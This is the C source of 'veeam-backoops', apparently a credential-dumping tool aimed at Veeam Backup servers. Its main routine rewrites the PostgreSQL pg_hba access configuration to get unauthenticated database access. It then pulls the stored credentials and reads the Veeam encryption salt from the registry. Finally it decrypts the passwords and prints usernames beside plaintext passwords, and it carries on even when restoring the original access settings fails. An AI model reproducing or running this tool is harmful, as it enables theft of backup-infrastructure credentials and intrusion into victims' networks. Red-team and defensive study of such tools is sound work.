/* veeam-backoops.c */

/*
 * Author: ripmeep
 * Date  : 13/09/2025
 */

#include <windows.h>
#include "veeam-backoops.h"

int main(void) {
  char libpq_path[MAX_PATH];
  int status;
  libpq_t pq;
  CONSOLE_SCREEN_BUFFER_INFO console_info;
  HANDLE h_stdout = GetStdHandle(STD_OUTPUT_HANDLE);

  GetConsoleScreenBufferInfo(h_stdout, &console_info);
  SetConsoleTextAttribute(h_stdout, (console_info.wAttributes & 0xFFF0) | FOREGROUND_GREEN);
  printf("\n\t\t--+== veeam-backoops by ripmeep ==+--\n\n");
  SetConsoleTextAttribute(h_stdout, console_info.wAttributes);

  if ((status = vb_libpq_map(&pq, libpq_path, sizeof(libpq_path))) != ERROR_SUCCESS) {
    fprintf(stderr, "- vb_libpq_map(...) failed to map libpq functions [0x%08x]\n", status);
    fprintf(stderr, "- Check if \"%s\" exists and libpq.dll is in the bin directory\n", PG_ROOT_PATH);
    return 1;
  }

  printf("- Mapped libpq successfully [libpq v%d]\n", pq.PQlibVersion());

  vb_data_t vb_data = {0};

  if (!vb_data_pg_hba_overwrite(&vb_data)) {
    fprintf(stderr, "- vb_data_pg_hba_overwrite(...) failed to create copy of or overwrite PostgreSQL access configuration [0x%02x]\n", status);
    goto cleanup;
  }

  printf("- Successfully overwritten PostgreSQL access configuration\n");

  if (!(status = vb_libpq_connect(&pq))) {
    fprintf(stderr,
            "- vb_libpq_connect(...) failed to connect to database \"%s\" @ %s as user \"%s\" [0x%02x]",
            PG_DATABASE, PG_HOST, PG_USERNAME, status);
    goto cleanup;
  }

  printf("- Connected to database [db=%s] [user=%s]\n", PG_DATABASE, PG_USERNAME);

  /* Uh oh - upon failing the pg_hba restoration, we will just dump all info we have of the original copy. */
  if (!vb_data_pg_hba_restore(&vb_data)) {
    fprintf(stderr,
            "- vb_data_pg_hba_restore(...) failed to restore the original PostgreSQL access configuration [0x%08lx]\n" \
            "  Manual intervention is required - either:\n" \
            "  -  Check if \"%s\" exists, and replace the original config with it" \
            "       OR\n" \
            "  -  Below is what we have of the original configuration\n" \
            "     If possible, please replace the contents of \"%s\" with the below:\n",
            GetLastError(), vb_data.pg_hba_path_copy, vb_data.pg_hba_path);

    fprintf(stderr, "\n%s\n\n", vb_data.pg_hba_orig);

    /* Let's still try >:) */
    // goto cleanup;
  }

  printf("- Restored original PostgreSQL access configuration\n");

  if (!(status = vb_get_credentials(&pq, &vb_data.vbc))) {
    fprintf(stderr, "- vb_get_credentials(...) failed to query database or extract any credentials [%s]\n", PG_DATABASE);
    goto cleanup;
  }

  printf("- %d Credential(s) successfully extracted from database [%s]\n", status, PG_DATABASE);

  if (!vb_get_encryption_salt(&vb_data.encryption_salt, VEEAM_SALT_ROOT, VEEAM_SALT_SUBKEY, VEEAM_SALT_KEY)) {
    fprintf(stderr,
            "- vb_get_encryption_salt(...) failed to retrieve the encryption salt from registry [%s\\%s]\n",
            VEEAM_SALT_SUBKEY, VEEAM_SALT_KEY);
    goto cleanup;
  }

  printf("- Retrieved Veeam encryption salt [%s]\n", vb_data.encryption_salt);

  int d = 0;
  for (struct vb_credential *tmp = vb_data.vbc; tmp; tmp = tmp->next) {
    if (!vb_credential_decrypt(tmp, vb_data.encryption_salt)) {
      fprintf(stderr, "- Failed to decrypted %s password\n", tmp->user_name);
      continue;
    }

    d++;
  }

  printf("- Decrypted %d/%d passwords:\n", d, status);

  if (d) {
    printf("\n\t");
    #if SHOW_DESCRIPTION
      printf("%-48s | ", "DESCRIPTION");
    #endif
    printf("%-32s | %s\n\t", "USERNAME", "PLAINTEXT PASSWORD");

    #if SHOW_DESCRIPTION
      printf("-------------------------------------------------+-");
    #endif
    printf("---------------------------------+---------------------------------\n");

    for (struct vb_credential *tmp = vb_data.vbc; tmp; tmp = tmp->next) {
      if (!tmp->plaintext) /* Only want to show credentials which we have decrypted successfully */
        continue;
      printf("\t");
      #if SHOW_DESCRIPTION
        printf("%-48s | ", tmp->description);
      #endif
      printf("%-32s | %s\n", tmp->user_name, tmp->plaintext);
    }

    printf("\n");
  }

cleanup:

  vb_libpq_free(&pq);
  vb_data_free(&vb_data);

  printf("- Cleaned up process memory\n");

  return 0;
}
